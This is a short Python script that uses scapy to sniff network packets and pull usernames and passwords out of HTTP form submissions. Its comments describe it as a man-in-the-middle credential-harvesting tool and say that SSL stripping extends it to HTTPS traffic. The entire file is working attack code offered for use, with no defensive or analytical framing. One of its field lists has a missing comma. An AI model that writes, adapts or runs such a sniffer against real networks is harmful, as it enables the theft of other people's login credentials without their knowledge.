## A Program that extract's usernames and password's(clear text and hashes) from network packets (used with Man in the middle)
## This Program works with HTTP only So for it to work on HTTPS you have to have SSL striping working on the side.

from scapy.all import *
from urllib import parse
import re

iface = "eth0" # specify the interface that is listening

def get_login_pass(body):
    user = None
    passwd = None
    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',   # Possible user fields
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', # Possible passwd fields
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)  # Using regex to determine if one of the user fields exists in the packet
        if login_re:
            user = login_re.group()

    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE) # Using regex to determine if one of the password fields exists in the packet
        if pass_re:
            passwd = pass_re.group()
    if user and passwd:
        return(user, passwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(RAW) and packet.haslayer(IP):# RAW is a TCP sub layer
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass is not None:
            print(f"\n {packet[TCP].payload}")
            print(parse.unquote((user_pass[1])))
            print(parse.unquote((user_pass[0])))
        else:
            pass
          
          
try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print("Exiting...")
    exit(0)
